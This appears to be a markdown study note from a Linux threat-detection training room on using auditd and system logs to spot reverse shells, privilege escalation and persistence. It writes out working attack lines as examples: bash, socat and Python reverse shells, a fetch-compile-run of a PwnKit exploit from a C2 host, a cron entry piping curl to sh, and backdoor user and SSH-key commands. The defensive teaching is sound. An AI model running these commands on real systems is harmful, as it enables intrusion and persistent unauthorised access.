@@ -1,0 +1,203 @@
+# Linux Threat Detection 3
+
+## Overview
+Not all Linux attacks are automated (e.g., SSH brute force, cryptominers). Targeted Linux intrusions can resemble advanced Windows breaches and often involve:
+- Manual attacker interaction
+- Privilege escalation
+- Long-term persistence
+- Lateral movement or espionage/ransomware objectives
+
+This room focuses on detecting these attacks primarily using **auditd** and system logs.
+
+---
+
+## Attack Convenience & Initial Access
+When attackers gain access via:
+- **SSH** → Full interactive terminal
+- **Web exploits / RCE** → Limited shell (no Ctrl+C, buggy output, timeouts)
+
+Attackers often upgrade access using **reverse shells**.
+
+---
+
+## Reverse Shells
+
+### Common Reverse Shell Commands (PoC)
+```bash
+# Bash reverse shell
+bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
+
+# Socat reverse shell
+socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
+
+# Python reverse shell
+python3 -c '... s.connect(("10.30.30.30",80)); pty.spawn("bash")'
+```
+
+### Why Reverse Shells Matter
+- Indicate **active human attacker**
+- Allow full command execution
+- Treated as **critical SOC alerts**
+
+### Detecting Reverse Shells with auditd
+```bash
+ausearch -i -x socat              # Find suspicious reverse shell tools
+ausearch -i --pid <pid>           # Trace parent process
+ausearch -i --ppid <pid>          # Build full process tree
+```
+
+Key indicators:
+- Outbound connections to attacker IPs
+- Reverse shell spawned from web apps (e.g., Python, Apache)
+
+---
+
+## Reverse Shell Activity Enumeration
+```bash
+ausearch -i -x socat
+ausearch -i --ppid <reverse_shell_pid> | grep proctitle
+```
+
+Typical discovery commands after shell:
+- `id`
+- `uname -a`
+- `ls -la`
+- `pwd`
+
+---
+
+## Privilege Escalation (PE)
+
+### Common PE Triggers
+| Discovery Result | Privilege Escalation |
+|-----------------|---------------------|
+| Old kernel | Kernel exploit (e.g., PwnKit) |
+| SUID binary | Abuse SUID permissions |
+| SSH keys exposed | Login as root |
+
+### Example Privilege Escalation Chain
+```bash
+whoami
+uname -r
+wget http://c2-server/pwnkit.c -O /tmp/pwnkit.c
+gcc /tmp/pwnkit.c -o /tmp/pwnkit
+chmod +x /tmp/pwnkit
+/tmp/pwnkit
+```
+
+### Detecting Privilege Escalation
+Key signals:
+- **Spike in discovery commands**
+- **Executable downloads to /tmp**
+- **UID change (service user → root)**
+
+```bash
+ausearch -i -x pwnkit
+ausearch -i --ppid <pid>          # Look for root shell spawn
+```
+
+---
+
+## Persistence Techniques
+
+### 1. Cron Job Persistence
+Files to monitor:
+- `/etc/crontab`
+- `/etc/cron.d/*`
+- `/var/spool/cron/*`
+
+Example (APT / Cryptominer):
+```bash
+@reboot nohup /home/user/.hidden/malware &
+*/10 * * * root (curl https://pastebin.com/raw/...) | sh
+```
+
+Detection:
+```bash
+ausearch -i -x crontab
+ausearch -i -f /etc/cron.d
+```
+
+---
+
+### 2. Systemd Persistence
+Attackers create fake services:
+```ini
+[Unit]
+Description=cloud-online
+[Service]
+ExecStart=/usr/bin/cloud-online
+```
+
+Detection:
+```bash
+ausearch -i -f /etc/systemd
+ausearch -i -x systemctl
+```
+
+---
+
+## Account Persistence
+
+### New User Creation
+```bash
+useradd support
+usermod -aG sudo support
+```
+
+Detection:
+```bash
+cat /var/log/auth.log | grep -E 'useradd|usermod'
+```
+
+---
+
+### Backdoored SSH Keys
+```bash
+echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
+```
+
+Important:
+- `echo` is a shell builtin → command not logged clearly
+- **File modification monitoring is critical**
+
+Detection:
+```bash
+ausearch -i -f authorized_keys
+```
+
+---
+
+## Application-Level Persistence
+- Web shells (e.g., WSO, PHP backdoors)
+- Lives entirely in app layer
+- Often invisible to auditd
+
+If malware reappears with no OS-level persistence → check apps.
+
+---
+
+## Targeted Attack Scenarios
+
+### Linux as Entry Point
+- Breach public-facing Linux server
+- Pivot into Windows environment
+
+### Linux in Espionage
+- Long-term access
+- Systemd-based persistence
+- Example: Kimsuky APT
+
+### Linux in Ransomware
+- Linux hypervisors as prime targets
+- One breach → hundreds of VMs encrypted
+
+---
+
+## Key Takeaways
+- Linux attacks can be **manual and stealthy**
+- Reverse shells = confirmed compromise
+- Privilege escalation often detectable by behavior
+- Persistence relies on **simple text files**
+- auditd is a powerful detection tool
+- Linux monitoring is a critical SOC requirement
